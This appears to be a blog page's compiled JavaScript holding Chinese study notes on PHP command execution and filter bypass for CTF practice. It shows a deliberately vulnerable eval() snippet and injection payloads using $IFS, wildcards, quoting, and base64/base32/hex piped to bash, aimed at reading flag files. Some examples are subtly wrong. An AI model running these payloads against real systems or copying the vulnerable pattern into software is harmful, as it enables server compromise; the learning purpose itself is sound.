import{Bt as e,Gn as t,Gt as n,H as r,Qn as i,Rt as a,V as o,X as s,_n as c}from"./framework.DfD1zdSt.js";import{t as l}from"./theme.DMgGaAyl.js";import"./chunks/vue-i18n.BSMUyWAh.js";import{a as u,i as d}from"./chunks/vue-router.DZdD3Cav.js";var f={__name:`命令执行`,setup(f,{expose:p}){let m=t(JSON.parse(`{"title":"命令执行","description":"","frontmatter":{"title":"命令执行","date":"2024-10-08 20:12:51","tags":["rce"],"categories":["学习笔记"],"firstImage":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152203957.png"},"headers":[],"relativePath":"pages/posts/命令执行.md"}`)),h=u(),g=d(),_=Object.assign(g.meta.frontmatter||{},m.value?.frontmatter||{});return h.currentRoute.value.data=m.value,e(`valaxy:frontmatter`,_),globalThis.$frontmatter=_,p({frontmatter:{title:`命令执行`,date:`2024-10-08 20:12:51`,tags:[`rce`],categories:[`学习笔记`]}}),(e,t)=>{let u=l;return a(),r(u,{frontmatter:i(_)},{"main-content-md":c(()=>[...t[0]||=[o(`p`,null,`摘要：命令执行 命令执行函数 system systemstring $command,int &$returnval=? 常用参数：command：执行command参数所指定2的命令，并且输出执行结果 ​ 如果提供returnvar参数，则外部命令执行后的返回状态将会被设置到此变量中 ------。`,-1),o(`p`,null,`<!-- more -->`,-1),o(`h3`,{id:`命令执行`,tabindex:`-1`},[s(`命令执行 `),o(`a`,{class:`header-anchor`,href:`#命令执行`,"aria-label":`Permalink to "命令执行"`},`​`)],-1),o(`h3`,{id:`命令执行函数`,tabindex:`-1`},[s(`命令执行函数 `),o(`a`,{class:`header-anchor`,href:`#命令执行函数`,"aria-label":`Permalink to "命令执行函数"`},`​`)],-1),o(`h4`,{id:`system`,tabindex:`-1`},[o(`strong`,null,`system`),s(),o(`a`,{class:`header-anchor`,href:`#system`,"aria-label":`Permalink to "**system**"`},`​`)],-1),o(`p`,null,[o(`strong`,null,`system(string $command,int &$return_val=?)`)],-1),o(`p`,null,`常用参数：command：执行command参数所指定2的命令，并且输出执行结果`,-1),o(`p`,null,`​ 如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152203957.png`,alt:`image-20240415220301914`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`h4`,{id:`exec`,tabindex:`-1`},[o(`strong`,null,`exec`),s(),o(`a`,{class:`header-anchor`,href:`#exec`,"aria-label":`Permalink to "**exec**"`},`​`)],-1),o(`p`,null,[o(`strong`,null,`exec(string $command,array&$output=?,int&$return_car=?)`)],-1),o(`p`,null,`command参数：要执行的命令。单独使用时只有最后一行结果，且不会回显`,-1),o(`p`,null,`output参数：用命令执行的输出填充此数组，每行输出填充数组中的一个元素。即逐行填充数组`,-1),o(`p`,null,`需借用print_r输出结果`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152213807.png`,alt:`image-20240415221342762`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`h4`,{id:`passthru`,tabindex:`-1`},[o(`strong`,null,`passthru`),s(),o(`a`,{class:`header-anchor`,href:`#passthru`,"aria-label":`Permalink to "**passthru**"`},`​`)],-1),o(`p`,null,[o(`strong`,null,`passthru(string $command,int &$return_var=? )`)],-1),o(`p`,null,`command 参数:要执行的命令`,-1),o(`p`,null,`输出二进制数据，并且需要直接传送到浏览器`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152216415.png`,alt:`image-20240415221627371`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`h4`,{id:`shell-exec`,tabindex:`-1`},[o(`strong`,null,`shell_exec`),s(),o(`a`,{class:`header-anchor`,href:`#shell-exec`,"aria-label":`Permalink to "**shell_exec**"`},`​`)],-1),o(`p`,null,[o(`strong`,null,`shell_exec`),s(`(string $cmd)`)],-1),o(`p`,null,`cmd 参数：要执行的命令`,-1),o(`p`,null,`环境执行命令，并且将完整的输出以字符串的方式返回。功能等同于反引号`,-1),o(`p`,null,`借用 echo ，print返回输出结果`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152232616.png`,alt:`image-20240415223256581`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`h4`,{id:`反引号`,tabindex:`-1`},[s(`反引号 `),o(`a`,{class:`header-anchor`,href:`#反引号`,"aria-label":`Permalink to "反引号"`},`​`)],-1),o(`p`,null,[o(`strong`,null,"反引号`cmd `")],-1),o(`p`,null,`在无字母，无数字的回显中使用极多`,-1),o(`p`,null,`反引号也能执行系统指令`,-1),o(`p`,null,`用echo/print来输出`,-1),o(`hr`,null,null,-1),o(`h4`,{id:`popen`,tabindex:`-1`},[s(`popen `),o(`a`,{class:`header-anchor`,href:`#popen`,"aria-label":`Permalink to "popen"`},`​`)],-1),o(`p`,null,[o(`strong`,null,`popen(string $command,string $mode)`)],-1),o(`p`,null,`commmand:要执行的命令`,-1),o(`p`,null,`mode：模式。‘r’表示阅读，‘w’表示写入`,-1),o(`p`,null,`fgets获取内容->print_r输出内容`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152243626.png`,alt:`image-20240415224354583`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`p`,null,[s(`了解，跟popen函数差不多：`),o(`strong`,null,`proc_open($command,$descriptor_spec,$pipes,$cwd,$env_vars,$options)`)],-1),o(`p`,null,`前三个参数是必要的`,-1),o(`p`,null,`command：要执行的命令`,-1),o(`p`,null,`descriptor_spec:定义数组的内容`,-1),o(`p`,null,`pipes：调用数组内容`,-1),o(`hr`,null,null,-1),o(`h4`,{id:`pcntl-exec`,tabindex:`-1`},[s(`pcntl_exec `),o(`a`,{class:`header-anchor`,href:`#pcntl-exec`,"aria-label":`Permalink to "pcntl_exec"`},`​`)],-1),o(`p`,null,[o(`strong`,null,`pcntl_exec(string $path,array$args=?,array$envs=?)`)],-1),o(`p`,null,`path必须时可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本（比如文件第一行是#!/user/local/bin/perl的perl脚本）`,-1),o(`p`,null,`args是一个要传递给程序的参数的字符串数组`,-1),o(`p`,null,`envs是一个要传递给程序作为环境变量的字符串数组。这个数组是key=>value格式的，key代表要传递的环境变量的名称，value代表该环境变量值`,-1),o(`p`,null,`在当前进程空间执行指定程序`,-1),o(`hr`,null,null,-1),o(`h3`,{id:`替换绕过函数`,tabindex:`-1`},[s(`替换绕过函数 `),o(`a`,{class:`header-anchor`,href:`#替换绕过函数`,"aria-label":`Permalink to "替换绕过函数"`},`​`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`<?php
header("content-type:text/html;charset=utf-8"); 
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['cmd'])){
    $c = $_GET['cmd'];
    if(!preg_match("/exec|system|popen|proc_open|\\\`/i", $c)){
        eval($c);
    }
    else{
        echo "你是黑客么？";
    }
}
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`没有过滤passthru，使用passthru(“ls”)，查看目录`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404161437313.png`,alt:`image-20240416143710195`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,`再次使用passthru(“cat flag.php”)在源码里查看flag文件`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404161438824.png`,alt:`image-20240416143804717`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`hr`,null,null,-1),o(`h3`,{id:``,tabindex:`-1`},[o(`a`,{class:`header-anchor`,href:`#`,"aria-label":`Permalink to ""`},`​`)],-1),o(`p`,null,[o(`strong`,null,`LD_PRELOAD绕过原理`),s(`（不懂，不理解）`)],-1),o(`p`,null,`使用场景：disable_functions禁用所有肯用到命令执行的函数`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404161440425.png`,alt:`image-20240416144048258`,loading:`lazy`,decoding:`async`})],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404161521446.png`,alt:`image-20240416152140349`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`h3`,{id:`mail`,tabindex:`-1`},[s(`mail() `),o(`a`,{class:`header-anchor`,href:`#mail`,"aria-label":`Permalink to "mail()"`},`​`)],-1),o(`h4`,{id:`绕过条件`,tabindex:`-1`},[s(`绕过条件 `),o(`a`,{class:`header-anchor`,href:`#绕过条件`,"aria-label":`Permalink to "绕过条件"`},`​`)],-1),o(`p`,null,`能够上传自己的.so文件`,-1),o(`p`,null,`能够控制环境变量的值（设置LD_PRELOAD变量），比如putenv函数未被禁止`,-1),o(`p`,null,`存在可以控制PHP启动外部程序的函数并能执行(因为新进程启动将加载LD_PRELOAD中的.so文件)，比如mail()、imap_mail()、mb_send_mail()和error_log()等。`,-1),o(`h4`,{id:`构造payload`,tabindex:`-1`},[s(`构造payload `),o(`a`,{class:`header-anchor`,href:`#构造payload`,"aria-label":`Permalink to "构造payload"`},`​`)],-1),o(`p`,null,`mail函数——调用子程序“/user/sbin/sendmail”——调动态链接库geteuid函数`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222117087.png`,alt:`image-20240422211743826`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`h4`,{id:`evil-cmdline`,tabindex:`-1`},[s(`EVIL_CMDLINE `),o(`a`,{class:`header-anchor`,href:`#evil-cmdline`,"aria-label":`Permalink to "EVIL_CMDLINE"`},`​`)],-1),o(`p`,null,`执行其他命令`,-1),o(`hr`,null,null,-1),o(`hr`,null,null,-1),o(`h3`,{id:`蚁剑及pcntl绕过函数过滤`,tabindex:`-1`},[s(`蚁剑及pcntl绕过函数过滤 `),o(`a`,{class:`header-anchor`,href:`#蚁剑及pcntl绕过函数过滤`,"aria-label":`Permalink to "蚁剑及pcntl绕过函数过滤"`},`​`)],-1),o(`h4`,{id:`蚁剑`,tabindex:`-1`},[s(`蚁剑 `),o(`a`,{class:`header-anchor`,href:`#蚁剑`,"aria-label":`Permalink to "蚁剑"`},`​`)],-1),o(`p`,null,`使用工具`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222137215.png`,alt:`image-20240422213700006`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`h4`,{id:`pcntl-exec函数`,tabindex:`-1`},[s(`pcntl_exec函数 `),o(`a`,{class:`header-anchor`,href:`#pcntl-exec函数`,"aria-label":`Permalink to "pcntl_exec函数"`},`​`)],-1),o(`p`,null,[o(`strong`,null,`pcntl_exec(string $path,array$args=?,array$envs=?)`)],-1),o(`p`,null,`path必须时可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本（比如文件第一行是#!/user/local/bin/perl的perl脚本）`,-1),o(`p`,null,`args是一个要传递给程序的参数的字符串数组`,-1),o(`p`,null,`envs是一个要传递给程序作为环境变量的字符串数组。这个数组是key=>value格式的，key代表要传递的环境变量的名称，value代表该环境变量值`,-1),o(`p`,null,`在当前进程空间执行指定程序`,-1),o(`p`,null,`path:/bin/bash args:-c/bin/ls`,-1),o(`hr`,null,null,-1),o(`p`,null,`info信息：没有禁用pcntl_exec函数`,-1),o(`p`,null,`pcntl_exec函数没有回显`,-1),o(`p`,null,`解决方法一：cat文件并输出到有权限读取路径；`,-1),o(`p`,null,`解决方法二：shell反弹`,-1),o(`hr`,null,null,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222154839.png`,alt:`image-20240422215438700`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`h3`,{id:`操作系统连接符`,tabindex:`-1`},[s(`操作系统连接符 `),o(`a`,{class:`header-anchor`,href:`#操作系统连接符`,"aria-label":`Permalink to "操作系统连接符"`},`​`)],-1),o(`h4`,{id:`-1`,tabindex:`-1`},[s(`; `),o(`a`,{class:`header-anchor`,href:`#-1`,"aria-label":`Permalink to ";"`},`​`)],-1),o(`p`,null,`使多个命令按顺序执行`,-1),o(`p`,null,`前面的命令和后面的命令都会执行`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222159031.png`,alt:`image-20240422215911843`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`h4`,{id:`-2`,tabindex:`-1`},[s(`& `),o(`a`,{class:`header-anchor`,href:`#-2`,"aria-label":`Permalink to "&"`},`​`)],-1),o(`p`,null,`使命令在后台运行`,-1),o(`p`,null,`这样就可以同时执行多条命令`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222200738.png`,alt:`image-20240422220058617`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`h4`,{id:`-3`,tabindex:`-1`},[s(`&& `),o(`a`,{class:`header-anchor`,href:`#-3`,"aria-label":`Permalink to "&&"`},`​`)],-1),o(`p`,null,`若果前面的命令执行成功`,-1),o(`p`,null,`则执行后面的命令`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222204341.png`,alt:`image-20240422220427195`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`h4`,{id:`-4`,tabindex:`-1`},[s(`| `),o(`a`,{class:`header-anchor`,href:`#-4`,"aria-label":`Permalink to "|"`},`​`)],-1),o(`p`,null,`将前面的命令的输出作为后面命令的输入，把前面命令的结果当成后面命令的参数`,-1),o(`p`,null,`前面的命令和后面的命令都会执行，但只显示后面的命令执行结果`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222207997.png`,alt:`image-20240422220722894`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`h4`,{id:`-5`,tabindex:`-1`},[s(`|| `),o(`a`,{class:`header-anchor`,href:`#-5`,"aria-label":`Permalink to "||"`},`​`)],-1),o(`p`,null,`类似于程序中的if-else语句`,-1),o(`p`,null,`若前面的命令执行失败，则后面的命令就不会执行`,-1),o(`p`,null,`若前面的命令执行失败，则执行后面的命令`,-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222212392.png`,alt:`image-20240422221217054`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`h3`,{id:`空格过滤绕过`,tabindex:`-1`},[s(`空格过滤绕过 `),o(`a`,{class:`header-anchor`,href:`#空格过滤绕过`,"aria-label":`Permalink to "空格过滤绕过"`},`​`)],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404231458831.png`,alt:`image-20240423145809746`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,[o(`strong`,null,`绕过方法`)],-1),o(`p`,null,[o(`strong`,null,`1.大括号{cat,flag.txt};`)],-1),o(`p`,null,[o(`strong`,null,"2.$IFS代替空格；$IFS,${IFS},$IFS$9")],-1),o(`p`,null,`linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符`,-1),o(`p`,null,`例子：`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?cmd=ls$IFS-l
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`单纯$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名`,-1),o(`p`,null,`例子`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?cmd=ls\${IFS}-l
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`*$IFS$9-后面加个$与{}类似，起截断作用，$9是当前系统shell进程的第九个参数的持有者，始终为空字符`,-1),o(`p`,null,`例子`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?cmd=ls$IFS$9-l
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[o(`strong`,null,`3.重定向字符<,<>;`)],-1),o(`p`,null,`“<”表示的是输入重定向的意思，就是把<后面跟的文件取代键盘作为新的输入设备`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?cmd=cat<flag.php

?cmd=cat<>flag.php
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[o(`strong`,null,`4.url编码 %09（TAB），%20（space）；`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?cmd=cat%09flag.php
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`hr`,null,null,-1),o(`h3`,{id:`文件名过滤绕过`,tabindex:`-1`},[s(`文件名过滤绕过 `),o(`a`,{class:`header-anchor`,href:`#文件名过滤绕过`,"aria-label":`Permalink to "文件名过滤绕过"`},`​`)],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404231519432.png`,alt:`image-20240423151936357`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,[o(`strong`,null,`绕过方法`)],-1),o(`p`,null,[s(`*`),o(`em`,null,[s(`1.通配符？`),o(`em`,null,`绕过`)])],-1),o(`p`,null,`通配符是一种特殊语句，主要有问号和星号，用来模糊搜索文件`,-1),o(`p`,null,`?在linux里面可以进行代替字母。？仅代表単个字符串，但此单字必须存在`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`#cat fl?g.tx?
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`*在linux里面可以进行模糊匹配。*可以代表任何字符串`,-1),o(`p`,null,[o(`strong`,null,`2.単引号，双引号绕过`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`system('cat fl""ag.p""hp');
外单内双，外双内単
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[o(`strong`,null,`3.反斜杠\\绕过`)],-1),o(`p`,null,`把特殊字符去掉功能性，单纯表示为字符串`,-1),o(`p`,null,`system(‘cat fl\\ag.p\\hp’);`,-1),o(`p`,null,[s(`4.*`),o(`em`,null,[s(`特殊变量：$1到$9、$@和$`),o(`em`,null,`等`)])],-1),o(`p`,null,`输出为空`,-1),o(`p`,null,`cat fl$1ag.t$9xt`,-1),o(`p`,null,[o(`strong`,null,`5.内联执行`)],-1),o(`p`,null,`自定义字符串，再拼接起来`,-1),o(`p`,null,`a=f;d=ag;c=l;cat$a$c$d.txt`,-1),o(`p`,null,[o(`strong`,null,`6.利用linux中的环境变量`)],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241718857.png`,alt:`image-20240424171843635`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`h3`,{id:`常见文件读取命令绕过`,tabindex:`-1`},[s(`常见文件读取命令绕过 `),o(`a`,{class:`header-anchor`,href:`#常见文件读取命令绕过`,"aria-label":`Permalink to "常见文件读取命令绕过"`},`​`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`more:一页一页的显示档案内容
less:与 more 类似 head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号,跟cat功能类似
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看，用于排序文件
passthru("/usr/bin/s?rt" fl\\ag.p\\hp)
uniq:可以查看报告或删除文件中重复的文件
file -f:报错出具体内容 
grep 在文件中查找某些字符串
1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings
2.查找flag：?cmd=passthru("grep fla fla*") 从fla*文件中查找包含fla的字符串
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h3`,{id:`编码绕过`,tabindex:`-1`},[s(`编码绕过 `),o(`a`,{class:`header-anchor`,href:`#编码绕过`,"aria-label":`Permalink to "编码绕过"`},`​`)],-1),o(`p`,null,[o(`strong`,null,`绕过方法`)],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241758202.png`,alt:`image-20240424175819140`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,`1.base64编码`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`import base64
s=b'cat flag.php'
e64=base64.b64encode(s) 参数s的类型不必须是字节包
print（e64）

#echo Y2FOIGZsYWcucGhw|base64 -d
|把前面指令执行的结果变成后面指令的参数

执行命令
#echo Y2FOIGZsYWcucGhw|base64 |bash
#\`echo Y2FOIGZsYWcucGhw|base64\`
#$(echo Y2FOIGZsYWcucGhw|base64)
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`2.base32编码`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`import base64
s=b'cat flag.php'
e64=base64.b32encode(s) 参数s的类型不必须是字节包
print（e64）

?cmd=system('echo"MNQXIIDGNRQWOLTQNBYA===="|base32 -d|/bin/bash');

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`base32和Base64的区分方法 看到编码内容，只有大写和数字 根据Base64和Base32 区别： base64中包含大写字母（A-Z），小写字母（a-z），数字0—9以及+/； base32中只包含大写字母（A-Z）和数字234567`,-1),o(`p`,null,`3.hex编码`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`import binascii
s=b'tac flag'
h=binascii.b2a_hex(s)
print(h) 

执行命令
echo “ ”|xxd -r -p |bash
xxd 二进制显示和处理文件工具
-r -p将纯十六进制转储的反向输出打印为了ascll格式
bash也可换成sh、/bin/bash、反引号
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`4.shellcode编码`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`将ascll码前加\\x
用print打印 //echo 无法执行
?cmd=passthru("print'shellcode编码'|bash")
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241816512.png`,alt:`image-20240424181629448`,loading:`lazy`,decoding:`async`})],-1),o(`hr`,null,null,-1),o(`h3`,{id:`无回显时间盲注`,tabindex:`-1`},[s(`无回显时间盲注 `),o(`a`,{class:`header-anchor`,href:`#无回显时间盲注`,"aria-label":`Permalink to "无回显时间盲注"`},`​`)],-1),o(`p`,null,`页面无法shell反弹或者无法回显，或者没有权限，可尝试命令盲注`,-1),o(`p`,null,`更具返回的时间来进行判断`,-1),o(`p`,null,`读取文件指定行的指定位置的字符`,-1),o(`p`,null,`相关命令`,-1),o(`p`,null,[o(`strong`,null,`1.sleep`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`sleep 5  5秒后返回结果
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[o(`strong`,null,`2.cat+awk`),s(` NR awk逐行获取数据`)],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241956456.png`,alt:`image-20240424195618422`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,[o(`strong`,null,`3.cut -c`),s(` cut 命令逐列获取単个字符`)],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241958280.png`,alt:`image-20240424195850245`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,[o(`strong`,null,`4.if判断命令是否执行`)],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241959619.png`,alt:`image-20240424195930570`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,[s(`5.`),o(`strong`,null,`脚本`)],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251351441.png`,alt:`image-20240425135138314`,loading:`lazy`,decoding:`async`})],-1),o(`h3`,{id:`长度过滤绕过`,tabindex:`-1`},[s(`长度过滤绕过 `),o(`a`,{class:`header-anchor`,href:`#长度过滤绕过`,"aria-label":`Permalink to "长度过滤绕过"`},`​`)],-1),o(`h4`,{id:`相关命令`,tabindex:`-1`},[o(`strong`,null,`相关命令`),s(),o(`a`,{class:`header-anchor`,href:`#相关命令`,"aria-label":`Permalink to "**相关命令**"`},`​`)],-1),o(`h5`,{id:`_1-和-符号`,tabindex:`-1`},[o(`strong`,null,`1.>和>>符号`),s(),o(`a`,{class:`header-anchor`,href:`#_1-和-符号`,"aria-label":`Permalink to "**1.>和>>符号**"`},`​`)],-1),o(`p`,null,[s(`1）`),o(`strong`,null,`通过>来创建文件`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`echo benben>a
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`创建文件a，`,-1),o(`p`,null,`并把字符串‘benben’写入到文件a里面；`,-1),o(`p`,null,[o(`strong`,null,`注意`),s(`：通过>来讲命令执行结果写入文件会覆盖掉文件原本的内容`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`echo dazhuang>a
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`a中的内容就会由benben变为dazhuang`,-1),o(`p`,null,`单独使用>,会直接创建文件b`,-1),o(`p`,null,[s(`2）`),o(`strong`,null,`通过>>来追加内容`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`echo benben>>a
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`在原本文件内容后面追加“benben”`,-1),o(`h5`,{id:`_2-命令换行`,tabindex:`-1`},[o(`strong`,null,`2.命令换行`),s(),o(`a`,{class:`header-anchor`,href:`#_2-命令换行`,"aria-label":`Permalink to "**2.命令换行**"`},`​`)],-1),o(`p`,null,`在没有写完的命令后面加“\\”，可以将一条命令写在多行：`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`#cat a

#c\\
a\\
t\\
a
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`相当于\\把换行的命令连接到一起执行`,-1),o(`h5`,{id:`_3-ls-t命令`,tabindex:`-1`},[o(`strong`,null,`3. ls -t命令`),s(),o(`a`,{class:`header-anchor`,href:`#_3-ls-t命令`,"aria-label":`Permalink to "**3. ls -t命令**"`},`​`)],-1),o(`p`,null,`将文件名按照时间顺序排列出来（后创建的排在前面）`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`ls
a b c
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`按字母顺序显示文件名`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`ls -t
b c a

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`按时间顺序显示文件名（后创建的排在前面）`,-1),o(`p`,null,[o(`em`,null,`只能精确到秒`)],-1),o(`h5`,{id:`_4-组合运用`,tabindex:`-1`},[o(`strong`,null,`4.组合运用`),s(),o(`a`,{class:`header-anchor`,href:`#_4-组合运用`,"aria-label":`Permalink to "**4.组合运用**"`},`​`)],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251416193.png`,alt:`image-20240425141609130`,loading:`lazy`,decoding:`async`})],-1),o(`p`,null,[o(`strong`,null,`执行文件方法`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`.a或者sh a
执行命令从标准输入读取或从一个文件中读取
